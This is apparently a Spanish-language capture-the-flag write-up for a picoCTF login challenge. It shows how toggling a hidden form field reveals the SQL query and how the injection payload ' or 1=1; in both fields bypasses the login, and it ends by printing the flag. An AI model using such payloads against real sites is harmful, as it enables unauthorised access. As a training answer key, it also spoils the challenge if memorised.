## Descripción
There is a website running at `https://jupiter.challenges.picoctf.org/problem/50009/` ([link](https://jupiter.challenges.picoctf.org/problem/50009/)) or http://jupiter.challenges.picoctf.org:50009. Do you think you can log us in? Try to see if you can login!
## Solución
El código fuente de la página tenía un input de tipo hidden, al cambiarlo se mostró una caja de texto con el valor 0, le asigné el valor 1 y la página me mostró esto:
```
username: 
password: 
SQL query: SELECT * FROM users WHERE name='' AND password=''

# Login failed.
```
lo que indica que ni la entrada de username ni la de password validan los valores y se le pueden inyectar sentecias sql:
```
username: ' or 1=1;
password: ' or 1=1;
```
esto, combinado con la asignación del valor 1 en el input escondido, me permitieron logearme.
```
username: ' or 1=1;
password: ' or 1=1;
SQL query: SELECT * FROM users WHERE name='' or 1=1;' AND password='' or 1=1;'

# Logged in!

Your flag is: picoCTF{s0m3_SQL_fb3fe2ad}
```
## Notas
se le pone ' al principio de la sentencia para cerrar la comilla que el desarrollador usó y así poder insertar otra validación "or 1=1".
## Referencias